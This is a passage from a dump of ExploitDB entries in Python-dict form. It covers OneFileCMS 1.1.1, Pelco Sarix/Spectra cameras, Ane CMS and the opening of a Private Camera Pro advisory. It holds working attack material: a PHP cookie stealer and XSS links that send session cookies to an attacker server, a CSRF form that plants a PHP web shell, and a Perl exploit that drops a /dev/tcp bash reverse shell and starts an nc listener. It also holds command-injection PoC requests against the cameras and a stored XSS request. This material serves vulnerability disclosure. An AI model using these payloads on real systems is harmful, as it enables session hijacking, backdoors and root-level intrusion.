it!!!\r\n\r\nhttp://localhost/onefilecms/onefilecms.php?p=27%22%3e%3c%62%6f%64%79%20%6f%6e%6c%6f%61%64%3d%22%64%6f%63%75%6d%65%6e%74%2e%70%68%69%73%69%6e%67%2e%73%75%62%6d%69%74%28%29%3b%22%3e%3c%66%6f%72%6d%20%6e%61%6d%65%3d%22%70%68%69%73%69%6e%67%22%20%61%63%74%69%6f%6e%3d%22%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%22%3e%3c%2f%66%6f%72%6d%3e%3c%2f%62%6f%64%79%3e%3c%2f%68%74%6d%6c%3e\r\n\r\n=========================================================\r\n0x02 Cross Site Request Foregery (CSRF) vulnerability\r\n=========================================================\r\n\r\n---------------------------------------\r\n [!] Steal the cookie (sessionid) [!]\r\n---------------------------------------\r\n\r\n--- stealer.php ---\r\n<?php\r\nheader (\'Location:http://VICTIM_SERVER/onefilecms/onefilecms.php?f=index.php\');\r\n$cookie = $_GET[\'cookie\'];\r\n$log = fopen("gotit.txt", "a");\r\nfwrite($log, $cookie ."\\n");\r\nfclose($log);\r\n?>\r\n--- end ---\r\n\r\nSend this link to your victim...\r\n\r\nhttp://VICTIM_SERVER/onefilecms/onefilecms.php?p=\'"><script>document.location="http://ATTACKER_SERVER/stealer.php?cookie="+document.cookie;</script>\r\n\r\n...BUT, don\'t forget to encode it first!!!\r\n\r\nhttp://VICTIM_SERVER/onefilecms/onefilecms.php?p=%27%22%3E%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%22%68%74%74%70%3A%2F%2F%41%54%54%41%43%4B%45%52%5F%53%45%52%56%45%52%2F%73%74%65%61%6C%65%72%2E%70%68%70%3F%63%6F%6F%6B%69%65%3D%22%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3B%3C%2F%73%63%72%69%70%74%3E\r\n\r\nNow, check the "gotit.txt" file for the cookie.\r\nReplace the value of the "sessionid" with the cookie that you already grab...\r\n\r\n------------------------------------------\r\n [!] Create the evil file "csrf.php" [!]\r\n------------------------------------------\r\n\r\nhttp://VICTIM_SERVER/onefilecms/onefilecms.php?p=\'"><html><body onload=\'document.f.submit()\'>\r\n<form method=post name=f action="http://localhost/onefilecms/onefilecms.php">\r\n<input type="hidden" name="sessionid" value="HERE_PASTE_THE_VALUE">\r\n<input type="hidden" name="filename" value="csrf.php">\r\n<input name="content" value="<pre><?php system($_GET[\'cmd\']);exit;?>">\r\n<input type="submit" name="Save">\r\n</form></body></html>\r\n\r\n....enjoy the backdoor :)\r\nhttp://VICTIM_SERVER/onefilecms/csrf.php?cmd=[command]\r\n\r\n------------------------------------------\r\n [!] Delete the evil file "csrf.php" [!]\r\n------------------------------------------\r\n\r\nhttp://VICTIM_SERVER/onefilecms/onefilecms.php?p=\'"><html><body onload=\'document.f.submit()\'>\r\n<form method=post name=f action="http://localhost/onefilecms/onefilecms.php">\r\n<input type="hidden" name="sessionid" value="HERE_PASTE_THE_VALUE">\r\n<input type="hidden" name="delete_filename" value="csrf.php">\r\n<input type="submit" name="Yes">\r\n</form></body></html>\r\n\r\n#!/usr/bin/perl\r\n#\r\n# Exploit Title: OneFileCMS v.1.1.1 Remote Code Execution Exploit\r\n# Date: 22/8/2011\r\n# Author: mr.pr0n (@_pr0n_)\r\n# Homepage: http://ghostinthelab.wordpress.com/ - http://s3cure.gr\r\n# Software Link: http://onefilecms.com/download/onefilecms_site_v1.1.1.zip\r\n# Version: OneFileCMS v.1.1.1\r\n# Tested on: Linux Fedora 14\r\n\r\nuse LWP::UserAgent;\r\n\r\nprint "\\n   |==[ mr.pr0n ]=============================================== |\\n";\r\nprint "   | OneFileCMS 1.1.1 - [R]emote [C]ode [E]xecution [E]xploit    |\\n";\r\nprint "   |===================[ http://ghostinthelab.wordpress.com/ ]== |\\n";\r\n\r\nprint "\\nEnter the target (e.g.: http://victim.com)";\r\nprint "\\n> ";\r\n$target=<STDIN>;\r\nchomp($target);\r\n$target = "http://".$target if ($target !~ /^http:/);\r\n\r\nprint "Enter the OneFileCMS directory (e.g.: onefilecms)";\r\nprint "\\n> ";\r\n$dir=<STDIN>;\r\nchomp($dir);\r\n\r\n$target = $target."/".$dir;\r\n\r\nmenu:;\r\nprint "\\n[+] Main Menu:\\n";\r\nprint "    1. Steal the \\"sessionid\\" cookie.\\n";\r\nprint "    2. Get a shell on your target.\\n";\r\nprint "    3. Exit.\\n"\t;\r\n \r\nprint "> ";\r\n$option=<STDIN>;\r\nif ($option!=1 && $option!=2 && $option!=3)\r\n{\r\n\tprint "Oups, wrong option.\\nPlease, try again.\\n";\r\n\tgoto menu;\r\n}\r\n\r\n\tif ($option==1)\r\n\t{&cookie} \r\n\tif ($option==2)\r\n\t{&shell}\t\t\r\n\tif ($option==3)\r\n\t{&quit}\t\r\n\r\nsub cookie\r\n{\r\n\tprint "Enter the address of the \\"stealer.php\\" (e.g.: http://attacker.com/stealer.php)";\r\n\tprint "\\n> ";\r\n\t$stealer=<STDIN>;\r\n\tchomp($stealer);\r\n\r\n\t# -------------------------------------------------------------------------------------\r\n\t# stealer.php - source code\r\n\t# -------------------------------------------------------------------------------------\r\n\t# <?php\r\n\t# header (\'Location:http://VICTIM_SERVER/onefilecms/onefilecms.php?f=index.php\');\r\n\t# $cookie = $_GET[\'cookie\'];\r\n\t# $log = fopen("gotit.txt", "a");\r\n\t# fwrite($log, $cookie ."\\n");\r\n\t# fclose($log);\r\n\t# ?>\r\n\t# --------------------------------------------------------------------------------------\r\n\r\n\t$result = "\'\\"><script>document.location=\\"$stealer?cookie=\\"+document.cookie\\;</script>";\r\n\t$result =~ s/(.)/sprintf("%x%",ord($1))/eg;\r\n\r\n\tprint "\\n[+] Send this link to your victim ...\\n\\n";\r\n\tprint $target."/onefilecms.php?p=".$result."\\n";\r\n\tgoto menu;\r\n}\r\n\r\nsub shell\r\n{\r\n\tprint "Enter the sessionid:";\r\n\tprint "\\n> ";\r\n\t$sessionid=<STDIN>;\r\n\tchomp($sessionid);\r\n\r\n\tprint "Enter the IP address for the reverse connection (e.g.: 192.168.178.25)";\r\n\tprint "\\n> ";\r\n\t$ip=<STDIN>;\r\n\tchomp($ip);\r\n\r\n\tprint "Enter the port to connect back on (e.g.: 4444)";\r\n\tprint "\\n> ";\r\n\t$port=<STDIN>;\r\n\tchomp($port);\r\n\r\n\t$payload = \r\n\t"<?php ".\r\n\t"system(\'/bin/bash -i > /dev/tcp/$ip/$port 0\\<&1 2\\>&1\');".\r\n\t"?>";\r\n\r\n\t$filename = "index_".int(rand()*1011).".php";\r\n\r\n\t$csrf =\r\n\t"\'\\"><html><body onload=\'document.f.submit()\'>".\r\n\t"<form method=post name=f action=\\"$target/onefilecms.php\\">".\r\n\t"<input type=\\"hidden\\" name=\\"sessionid\\" value=\\"$sessionid\\">".\r\n\t"<input type=\\"hidden\\" name=\\"filename\\" value=\\"$filename\\">".\r\n\t"<input name=\\"content\\" value=\\"$payload\\">".\r\n\t"<input type=\\"submit\\" name=\\"Save\\">".\r\n\t"</form></body></html>";\r\n\r\n\t$csrf =~ s/(.)/sprintf("%x%",ord($1))/eg;\r\n\r\n\tprint "\\n[+] Send this link to your victim...\\n\\n";\r\n\tprint $target."/onefilecms.php?p=".$csrf."\\n";\r\n\r\n\t$nc= "nc -lvp $port";\r\n\tsystem("xterm -e $nc &");\r\n\r\n\tprint "\\n[+] Please be patient...\\n";\r\n\twhile (1)\r\n\t{\r\n\t\t$int = LWP::UserAgent->new() or die;\r\n\t\t$check=$int->get($target."/".$filename);\r\n\t\tif ($check->content =~ m/was not found/g)\r\n\t\t{\r\n\t\t\tsleep(10);\r\n\t\t}\r\n}\r\ngoto menu;\r\n}\r\n\r\nsub quit\r\n{\r\nexit(1);\r\n}', u'description': u'OneFileCMS 1.1.1 - Multiple Vulnerabilities', u'platform': u'php', u'author': u'mr.pr0n', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-08-21T00:00:00+00:00', u'_id': 17706, u'type': u'webapps', u'port': 0}

CVE: []
Description: Pelco Sarix/Spectra Cameras - Remote Code Execution
{u'code': u'Schneider Electric Pelco Sarix/Spectra Cameras Root Remote Code Execution\r\n\r\n\r\nVendor: Schneider Electric SE\r\nProduct web page: https://www.pelco.com\r\nAffected version: Sarix Enhanced - Model: IME219 (Firmware: 2.1.2.0.8280-A0.0)\r\n                  Sarix Enhanced - Model: IME119 (Firmware: 2.1.2.0.8280-A0.0)\r\n                  Sarix - Model: D5230 (Firmware: 1.9.2.23-20141118-1.9330-A1.10722)\r\n                  Sarix - Model: ID10DN (Firmware: 1.8.2.18-20121109-1.9110-O3.8503)\r\n                  Spectra Enhanced - Model: D6230 (Firmware: 2.2.0.5.9340-A0.0)\r\n\r\nSummary: Pelco offers the broadest selection of IP cameras designed\r\nfor security surveillance in a wide variety of commercial and industrial\r\nsettings. From our industry-leading fixed and high-speed IP cameras to\r\npanoramic, thermal imaging, explosionproof and more, we offer a camera\r\nfor any environment, any lighting condition and any application.\r\nWhen nothing but the best will do. Sarix\u2122 Enhanced Range cameras\r\nprovide the most robust feature-set for your mission-critical applications.\r\nWith SureVision\u2122 3.0, Sarix Enhanced delivers the best possible image\r\nin difficult lighting conditions such as a combination of bright areas,\r\nshaded areas, and intense light. Designed with superior reliability,\r\nfault tolerance, and processing speed, these rugged fixed IP cameras\r\nensure you always get the video that you need.\r\n\r\nDesc: The affected cameras suffer from authenticated remote code\r\nexecution vulnerability. The POST parameter \'enable_leds\' located\r\nin the update() function called via the GeneralSetupController.php\r\nscript is not properly sanitised before being used in writeLedConfig()\r\nfunction to enable led state to on or off. A remote attacker can\r\nexploit this issue and execute arbitrary system commands granting\r\nher system access with root privileges using a specially crafted\r\nrequest and escape sequence to system shell.\r\n\r\n\r\n---------------------------------------------------------------------------\r\n/var/www/core/setup/controllers/GeneralSetupController.php:\r\n-----------------------------------------------------------\r\n\r\n43: public function update() {\r\n44:         $errOccurred = false;\r\n45:         $logoreboot = false;\r\n46: \r\n47:         // If can update general settings\r\n48:         if ($this->_context->_user->hasPermission("{51510980-768b-4b26-a44a-2ae49f308184}")) {\r\n49:\r\n50:             $errors = $this->validateInputs("setup", "general.invalid");\r\n51:\r\n52: //\r\n53:             $new_logo_path;\r\n54:             if (empty($errors) && (strlen($_FILES["new_logo_path"]["name"]) > 0)) {\r\n55:                 // The user has provided a file to load in as an image.  Verify that the file is ok.\r\n56:                 $errors = $this->storeBmpFileIfValid($new_logo_path, $width, $height);\r\n57:             } else {\r\n58:                 // In this case, get the width and height from the omons settings\r\n59:                 $width = intval($this->_conf->get("Video/Overlay", "LogoWidth"));\r\n60:                 $height = intval($this->_conf->get("Video/Overlay", "LogoHeight"));\r\n61:             }\r\n62: //\r\n63:             if (empty($errors)) {\r\n64:                 $device_name = $_POST["device_name"];\r\n65:\r\n66:                 $this->_conf->set("Device", "FriendlyName", $device_name);\r\n67:\r\n68:                 // update smtp server; append port 25 if it\'s not provided by the user\r\n69:                 $smtpServer = $_POST["smtp_server"];\r\n70:\r\n71:                 if ((! empty($smtpServer)) && preg_match(self::kHostPortRegex, $smtpServer) == 0) {\r\n72:                     $smtpServer .= ":" . self::kDefaultSmtpPort;\r\n73:                 }\r\n74:\r\n75:                 $this->_conf->set("Networking", "SmtpServer", $smtpServer);\r\n76:\r\n77: //\r\n78:                 $success = $this->writeLedConfig($_POST["enable_leds"]);\r\n79: //\r\n80:             } else {\r\n81:                 $this->_context->setError("phobos", "validation.failure");\r\n82:                 $this->_context->setErrorList($errors);\r\n83:\r\n84:                 $errOccurred = true;\r\n85:             }\r\n86:         }\r\n\r\n...\r\n...\r\n...\r\n\r\nBonus hint: When uploading a bmp logo, you can modify the width offset for example and inject persistent code:\r\n--\r\n-> 12h: 00 01 00 00 ; width (max 0x100, min 0x20)\r\n--\r\n191:             if ($logoOverlay) {\r\n192:                 if($logoreboot) {\r\n193:                     $cmd = "/usr/bin/overlayLogo " . $logo_justification . " " . $logo_row . " " . $width  . " " .  $height . " 0";\r\n194:                     exec($cmd);\r\n195:                 }\r\n196:             } else {                \r\n197:                 $cmd = "/usr/bin/overlayLogo 1 1 1 1 1";\r\n198:                 exec($cmd);\r\n199:             }                \r\n\r\n...\r\n...\r\n...\r\n\r\n265:         $vparams["enable_leds"] = $this->getLedConfig();\r\n266: //\r\n267:         $vparams["device_name"]  = $this->_conf->get("Device", "FriendlyName");\r\n268:         $vparams["TimeFormat"] = $this->_conf->get("Video/Overlay", "TimeFormat");        \r\n269:         $vparams["date_formats"] = $this->getDateFormats();\r\n270:         $vparams["selectedDateFormat"] = $this->_conf->get("Video/Overlay", "DateFormat");\r\n271:\r\n272:         ob_start();\r\n273:         passthru("date +\\"" . $vparams["TimeFormat"] . "\\"");\r\n274:         $vparams["current_time"] = trim(ob_get_contents());\r\n275:         ob_end_clean();\r\n\r\n...\r\n...\r\n...\r\n\r\n630:     /** @param $state string "on" or "off" */\r\n631:     protected function writeLedConfig($state) {\r\n632:         $encoded = array(\'type\' => \'uint32\',\r\n633:             \'value\' => ($state == \'on\' ? 1 : 0));\r\n634:\r\n635:         $rest = $this->getRestProxy();\r\n636:         $params = array(array(\'type\' => \'uint32\', \'value\' => 10), $encoded);\r\n637:         $response = $rest->GetWithPayload(\'/internal/msgbus/com.pelco.hardware.led/SetState?\',\r\n638:                                \'application/json\',\r\n639:                                $params);\r\n640:\r\n641:         return ($response->GetStatus() == 200);\r\n642:     }\r\n\r\n---------------------------------------------------------------------------\r\n\r\n\r\nTested on: Linux 2.6.10_mvl401-1721-pelco_evolution #1 Tue Nov 18 21:15:30 EST 2014 armv5tejl unknown\r\n           MontaVista(R) Linux(R) Professional Edition 4.0.1 (0600980)\r\n           Lighttpd/1.4.28\r\n           PHP/5.3.0\r\n\r\n\r\nVulnerability discovered by Gjoko \'LiquidWorm\' Krstic\r\n                            @zeroscience\r\n\r\n\r\nAdvisory ID: ZSL-2017-5417\r\nAdvisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5417.php\r\n\r\n\r\n07.04.2017\r\n\r\n--\r\n\r\n\r\nPoC sleep 17s:\r\n\r\nPOST /setup/system/general/update HTTP/1.1\r\nHost: 192.168.1.1\r\nContent-Length: x\r\nCache-Control: max-age=0\r\nOrigin: http://192.168.1.1\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nReferer: http://192.168.1.1/setup/system/general\r\nAccept-Language: en-US,en;q=0.8,mk;q=0.6\r\nCookie: PHPSESSID=p2ooorb7gloavc0et2stj2tnn4; authos-token=07E14CAF; svcts=1495616826\r\nConnection: close\r\n\r\ndevice_name=ZSL&enable_leds=%60sleep%2017%60&smtp_server=&ntp_server_from_dhcp=false&ntp_server=time.nist.gov&region=Universe&zone=Earth&enable_time_overlay=on&enable_name_overlay=off&position=topright&date_format=0\r\n\r\n===\r\n\r\nPoC echo:\r\n\r\nPOST /setup/system/general/update HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\nenable_leds=%60echo%20251%20>test.html%60\r\n\r\n--\r\n\r\nGET http://192.168.1.1/test.html HTTP/1.1\r\n\r\nResponse:\r\n\r\n251', u'description': u'Pelco Sarix/Spectra Cameras - Remote Code Execution', u'platform': u'hardware', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2017-07-10T00:00:00+00:00', u'_id': 42309, u'type': u'webapps', u'port': 0}

CVE: []
Description: Ane CMS 1 - Persistent Cross-Site Scripting
{u'code': u'                                     =======================================================================\r\n    \r\n                                                  ANE CMS 1 Persistent XSS Vulnerability\r\n  \r\n                                     =======================================================================\r\n    \r\n                                                                   by\r\n    \r\n                                                              Pratul Agrawal\r\n  \r\n    \r\n    \r\n  # Vulnerability found in- Admin module\r\n    \r\n  # email         Pratulag@yahoo.com\r\n    \r\n  # company       aksitservices\r\n    \r\n  # Credit by     Pratul Agrawal\r\n  \r\n  # Software      ANE CMS 1\r\n \r\n  # Category      CMS / Portals\r\n \r\n  # Plateform     php\r\n   \r\n    \r\n    \r\n  #   Proof of concept   #\r\n  \r\n  Targeted URL:  http://server/acp/index.php?p=cfg&m=links\r\n   \r\n  \r\n  In ADD LINKS Field provide the malicious script to store in the Database.\r\n\r\n  That is-\r\n\r\n                      <html>\r\n\r\n                          <body>\r\n\r\n                             <form name="XYZ" action="http://server/acp/index.php?p=cfg&m=links&id=0" method="post">\r\n\r\n                                    <input type=hidden name="name" value=""><script>alert("XSS")</script>">\r\n\r\n                                    <input type=hidden name="link" value=""><script>alert("XSS")</script>">\r\n\r\n                                    <input type=hidden name="type" value="1">\r\n              \r\n                                    <input type=hidden name="view" value="0">\r\n\r\n                             </form>\r\n\r\n                               <script>\r\n\r\n                                 document.XYZ.submit();\r\n\r\n                               </script>\r\n\r\n                          </body>\r\n\r\n                        </html>\r\n\r\n\r\n  =======================================================================\r\n  Request -\r\n  =======================================================================\r\n  POST /acp/index.php?p=cfg&m=links&id=0 HTTP/1.1\r\n  Host: server\r\n  User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8\r\n  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n  Accept-Language: en-us,en;q=0.5\r\n  Accept-Encoding: gzip,deflate\r\n  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n  Keep-Alive: 300\r\n  Proxy-Connection: keep-alive\r\n  Referer: http://server/acp/index.php?p=cfg&m=links\r\n  Cookie: PHPSESSID=200fecb6b36334b983ebe251d11a5df9\r\n  Content-Type: application/x-www-form-urlencoded\r\n  Content-Length: 41\r\n\r\n  name="><script>alert("XSS")</script>&link="><script>alert("XSS")</script>&type=1&view=0\r\n \r\n  ======================================================================= \r\n  =======================================================================\r\n  Response-\r\n  =======================================================================\r\n  HTTP/1.1 200 OK\r\n  Date: Thu, 11 Mar 2010 06:59:03 GMT\r\n  Server: Apache/2.2.9 (Debian) mod_ssl/2.2.9 OpenSSL/0.9.8g\r\n  Expires: Thu, 19 Nov 1981 08:52:00 GMT\r\n  Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\n  Pragma: no-cache\r\n  Vary: Accept-Encoding\r\n  Content-Type: text/html; charset: utf-8\r\n  Content-Length: 7771\r\n\r\n&#65279;&#65279;<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />\r\n<title>Transdmin Light</title>\r\n\r\n<!-- CSS -->\r\n<link href="./skins/aaa/css/transdmin.css" rel="stylesheet" type="text/css" media="screen" />\r\n<!--[if IE 6]><link rel="stylesheet" type="text/css" media="screen" href="./skins/aaa/css/ie6.css" /><![endif]-->\r\n<!--[if IE 7]><link rel="stylesheet" type="text/css" media="screen" href="./skins/aaa/css/ie7.css" /><![endif]-->\r\n\r\n<!-- JavaScripts-->\r\n<link rel="stylesheet" type="text/css" href="http://server/system/js/jquery.jgrowl.css" media="screen"/> <script type="text/javascript" src="http://server/system/js/jquery-1.3.2.min.js"></script><script type="text/javascript" src="http://server/system/js/jquery.jgrowl_minimized.js"></script>\r\n<style>div.jGrowl div.green {\r\nbackground-color: \t\t#00D400;\r\ncolor: \t\t\t\t\tnavy;\r\n\t}</style> \r\n</head>\r\n\r\n<body>\r\n\t\r\n\t<div id="wrapper">\r\n    \t<!-- h1 tag stays for the logo, you can use the a tag for linking the index page -->\r\n    \t<h1><a href="#"><span>Administration</span></a></h1>\r\n\r\n        <!-- You can name the links with lowercase, they will be transformed to uppercase by CSS, we prefered to name them with uppercase to have the same effect with disabled stylesheet -->\r\n        <ul id="mainNav">\r\n        \t<li><a href="index.php">Dashboard</a></li>\r\n        \t<li><a href="?p=cfg">Configuration</a></li>\r\n        \t<li><a href="?p=tpl">Design</a></li>\r\n        \t<li><a href="?p=mod">Modules</a></li>\r\n        \t<li class="logout"><a href="#">Logout Admin</a></li>\r\n\t\t<li class="logout"><a href="../index.php">CMS</a></li>\r\n        </ul>\r\n        <!-- // #end mainNav -->\r\n\r\n        <div id="containerHolder">\r\n\t\t\t<div id="container">\r\n\t<div id="sidebar">\r\n\t\t\r\n\t<ul class="sideNav">\r\n\t                        \t<li><a href="?p=cfg">Show Setting</a></li>\r\n\t                        \t<li><a href="?p=cfg&m=mod">Modify Setting</a></li>\r\n\t                        \t<li><a href="?p=cfg&m=links">Links Management</a></li>\r\n\t                        \t<li><a href="?p=cfg&m=reposerver">Repository Server</a></li>\r\n\t                        </ul>\r\n\t\t\r\n\t</div>\r\n\t\r\n                <h2><a href="#">Configuration</a> \xbb <a href="#" class="active">Links</a></h2>\r\n\r\n                <div id="main"><br>\r\n\r\n                <form action="?p=cfg&m=links&id=0" class="jNice" method="POST">\r\n\r\n<h3>Aggiungi un nuovo Link</h3>\r\n                <fieldset><p><label>Nome link:</label><input type="text" class="text-long" name="name" value=""/></p>\r\n                <p><label>Nome link:</label><input type="text" class="text-long" name="link" value=""/></p>\r\n<p><label>Tipo Link:</label><input type="radio" name="type" value="1" checked>Barra Links <input type="radio" name="type" value="2">Menu Links</p>\r\n\r\n<p><label>Accesso:</label>\r\n                <select name="view">\r\n                        <option value="0">Visible only to guests</option>\r\n                        <option value="1">Visible to all</option>\r\n                        <option value="2">Visible only to members</option>\r\n                        <option value="3">Visible only to admins</option>\r\n                </select>\r\n                </p>\r\n                \r\n                <input type="submit" value="Send" />\r\n</fieldset>\r\n                        </form>\r\n\r\n<table cellpadding="0" cellspacing="0">\r\n\t\t\t    <tr>\r\n                                <td>Name</td>\r\n\t\t\t\t<td>Link</td>\r\n\t\t\t\t\r\n                                 <td>Options</td>\r\n                            </tr>\r\n                            <tr><td colspan="4">Bar Links</td></tr>\r\n\t\t\t    \t\t\t    <tr class="odd">\r\n                                <td>Home</td>\r\n\t\t\t\t<td>index.php</td>\r\n\t\t\t\t\r\n                <td><a href="?p=cfg&m=links&a=modify&id=1">Modify</a> <a href="?p=cfg&m=links&a=delete&id=1">Delete</a> <a href="?p=cfg&m=links&a=move&type=down&id=1">Move Down</a></td>\r\n                            </tr>\r\n\t\t\t\t\t\t    <tr class="odd">\r\n                                <td>Blog</td>\r\n\t\t\t\t<td>blog</td>\r\n\t\t\t\t\r\n                <td><a href="?p=cfg&m=links&a=modify&id=2">Modify</a> <a href="?p=cfg&m=links&a=delete&id=2">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=2">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=2">Move Down</a></td>\r\n                            </tr>\r\n\t\t\t\t\t\t    <tr class="odd">\r\n                                <td>Registrati</td>\r\n\t\t\t\t<td>register</td>\r\n\t\t\t\t\r\n                <td><a href="?p=cfg&m=links&a=modify&id=4">Modify</a> <a href="?p=cfg&m=links&a=delete&id=4">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=4">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=4">Move Down</a></td>\r\n                            </tr>\r\n\t\t\t\t\t\t    <tr class="odd">\r\n                                <td>ACP</td>\r\n\t\t\t\t<td>acp</td>\r\n\t\t\t\t\r\n                <td><a href="?p=cfg&m=links&a=modify&id=5">Modify</a> <a href="?p=cfg&m=links&a=delete&id=5">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=5">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=5">Move Down</a></td>\r\n                            </tr>\r\n\t\t\t\t\t\t    <tr class="odd">\r\n                                <td>Widgets</td>\r\n\t\t\t\t<td>index.php?modifywidgets</td>\r\n\t\t\t\t\r\n                <td><a href="?p=cfg&m=links&a=modify&id=6">Modify</a> <a href="?p=cfg&m=links&a=delete&id=6">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=6">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=6">Move Down</a></td>\r\n                            </tr>\r\n\t\t\t\t\t\t    <tr class="odd">\r\n                                <td>master</td>\r\n\t\t\t\t<td>master.asp</td>\r\n\t\t\t\t\r\n                <td><a href="?p=cfg&m=links&a=modify&id=38">Modify</a> <a href="?p=cfg&m=links&a=delete&id=38">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=38">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=38">Move Down</a></td>\r\n                            </tr>\r\n\t\t\t\t\t\t    <tr class="odd">\r\n                                <td>"><script>alert("XSS")</script></td>\r\n\t\t\t\t<td>"><script>alert("XSS")</script></td>\r\n\t\t\t\t\r\n                <td><a href="?p=cfg&m=links&a=modify&id=39">Modify</a> <a href="?p=cfg&m=links&a=delete&id=39">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=39">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=39">Move Down</a></td>\r\n                            </tr>\r\n\t\t\t<tr><td colspan="4">Menu Links</td></tr>\r\n\t\t\t    \t\t\t    <tr class="odd">\r\n                                <td>home</td>\r\n\t\t\t\t<td>index.php</td>\r\n\t\t\t\t\r\n                <td><a href="?p=cfg&m=links&a=modify&id=14">Modify</a> <a href="?p=cfg&m=links&a=delete&id=14">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=14">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=14">Move Down</a></td>\r\n                            </tr>\r\n\t\t\t\t\t\t    <tr class="odd">\r\n                                <td>Blog</td>\r\n\t\t\t\t<td>blog</td>\r\n\t\t\t\t\r\n                <td><a href="?p=cfg&m=links&a=modify&id=19">Modify</a> <a href="?p=cfg&m=links&a=delete&id=19">Delete</a> <a href="?p=cfg&m=links&a=move&type=up&id=19">Move up</a> <a href="?p=cfg&m=links&a=move&type=down&id=19">Move Down</a></td>\r\n                            </tr>\r\n\t\t\t                        </table>\r\n<br />\r\n</div>\r\n\r\n                \r\n                <!-- // #main -->\r\n\r\n                <div class="clear"></div>\r\n            </div>\r\n            <!-- // #container -->\r\n        </div>\r\n        <!-- // #containerHolder -->\r\n\r\n        <p id="footer">Feel free to use and customize it. <a href="http://server">Credit is appreciated.</a></p>\r\n    </div>\r\n    <!-- // #wrapper -->\r\n    \r\n                    <script type="text/javascript">\r\n                     $(function()\r\n\t\t\t{\r\n\t\t    });</script> \r\n</body>\r\n</html>\r\n\r\n \r\n=======================================================================\r\n \r\n \r\n   After completion Just Refres the page and the script get executed again and again.\r\n  \r\n  \r\n   #If you have any questions, comments, or concerns, feel free to contact me.', u'description': u'Ane CMS 1 - Persistent Cross-Site Scripting', u'platform': u'php', u'author': u'pratul agrawal', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-03-11T00:00:00+00:00', u'_id': 11687, u'type': u'webapps', u'port': 0}

CVE: []
Description: Private Camera Pro 5.0 iOS - Multiple Vulnerabilities
{u'code': u'Document Title:\r\n===============\r\nPrivate Camera Pro v5.0 iOS - Multiple Web Vulnerabilities\r\n\r\n\r\nReferences (Source):\r\n====================\r\nhttp://www.vulnerability-lab.com/get_content.php?id=1216\r\n\r\n\r\nRelease Date:\r\n=============\r\n2014-02-24\r\n\r\n\r\nVulnerability Laboratory ID (VL-ID):\r\n====================================\r\n1216\r\n\r\n\r\nCommon Vulnerability Scoring System:\r\n====================================\r\n8.1\r\n\r\n\r\nProduct & Service Introduction:\r\n===============================\r\nPrivate Camera is an iPhone and iPad camera app that could protect your privacy. It supports taking photos and recording videos, password \r\nlock protect, Fake password guest mode, share photos anytime and anywhere. Take photos and videos quick and easily. Support autofocus, \r\ntap to focus, flash light switch, camera switch, brand new UI, easy to use. Support taking still photo and recording video. Switch the \r\nvideo and photo mode one click. Create, rename, delete album, set album cover. Add photos to Album, remove photos from Album. Multiple photos \r\ncan be handled at a time, you can import photos from system camera roll, export photos to system camera roll, add photos to album, remove photos \r\nfrom album, delete multiple photos. Wi-Fi web access for photos upload, you can upload many photos from computer to iPhone or iPad in one shot.\r\nWith iOS 5, Private Camera can sync all your photos and videos on your iCloud account, you can access these photos & videos on all your iOS \r\ndevices, use and share these photos & videos anytime, everywhere. Protect photos and videos that you don\u2019t want to share. User requires enter \r\npassword when access the photos/videos library. Share photos and videos on Twitter, Facebook, Email with your friends.\r\n\r\nWith Password-lock functionality, can protect your personal photos and videos. Its unique Pseudo-password(decoy-password) guest mode, \r\ncan cope with annoying friends from seeing your private photos and videos. With easy to use camera features, let you using iPhone or \r\niPad take photos & videos and enjoy your photography life!\r\n\r\n( Copy of the Homepage: https://itunes.apple.com/us/app/private-camera-photo-vault/id477970594 )\r\n( Copy of the Homepage: https://itunes.apple.com/us/app/private-camera-pro-photo-vault/id473538611 )\r\n\r\n\r\nAbstract Advisory Information:\r\n==============================\r\nThe Vulnerability Laboratory Research Team discovered multiple web vulnerabilities in the official Private Camera Pro v5.0 iOS mobile web-application.\r\n\r\n\r\nVulnerability Disclosure Timeline:\r\n==================================\r\n2014-02-24:\tPublic Disclosure (Vulnerability Laboratory)\r\n\r\n\r\nDiscovery Status:\r\n=================\r\nPublished\r\n\r\n\r\nAffected Product(s):\r\n====================\r\nApple AppStore\r\nProduct: Private Camera Pro - iOS Web Application 5.0\r\n\r\n\r\nExploitation Technique:\r\n=======================\r\nRemote\r\n\r\n\r\nSeverity 